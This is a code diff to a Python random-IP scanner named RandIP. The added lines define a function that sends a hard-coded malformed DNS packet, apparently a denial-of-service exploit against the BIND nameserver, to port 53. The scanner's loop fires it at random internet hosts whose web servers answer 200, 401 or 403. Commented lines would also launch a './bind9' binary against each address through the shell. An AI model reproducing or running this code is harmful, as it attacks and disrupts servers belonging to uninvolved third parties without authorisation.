@@ -1,7 +1,7 @@
 #RandIP 0.9 beta#
 #Random IP Generator with Tor, Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
-import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess
+import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
 from random import randint
 from stem.util import term
 from PyQt4.QtGui import *
@@ -124,22 +124,30 @@ def randip():
 		yield ".".join(str(randint(1, 255)) for i in range(int(4)))
 
 def webGui():
-	import httplib2, sys
+	import httplib2
+	import signal
+	def sig_sighandler():
+		pass
+	signal.signal(signal.SIGINT, sig_sighandler)
 	http = httplib2.Http()
 	headers, content = http.request(myhost, "GET")
 	app = QApplication(sys.argv)
 	web = QWebView()
 	web.setHtml(content)
 	web.show()
-	while True:
-		try:
-			app.exec_()
-		except KeyboardInterrupt:
-			pass
+	app.exec_()
 
 logfile = str(timestr) + "_randip_log.txt"
 fp = open(logfile, 'w')
 #Tor_Connect()
+
+def tBindDOS():
+	print('Sending packet to ' + address + ' ...')
+	payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock.sendto(payload, (address, 53))
+	print('Done.')
+
 for address in randip():
 	try:
 		try:
@@ -157,13 +165,18 @@ for address in randip():
 			req = requests.get('http://' + address)
 			if str(req.status_code) == '200':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Works', term.Color.GREEN))
-				webGui()
+				tBindDOS()
+				#subprocess.call("./bind9 " + address, shell=True)
 			elif str(req.status_code) == '400':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Bad Request', term.Color.RED))
 			elif str(req.status_code) == '401':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Unauthorized', term.Color.YELLOW))
+				tBindDOS()
+				#subprocess.call("./bind9 " + address, shell=True)
 			elif str(req.status_code) == '403':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Forbidden', term.Color.YELLOW))
+				tBindDOS()
+				#subprocess.call("./bind9 " + address, shell=True)
 			elif str(req.status_code) == '404':
 				print(term.format('Response Code: ' + str(req.status_code) + ' Not Found', term.Color.RED))
 			else:
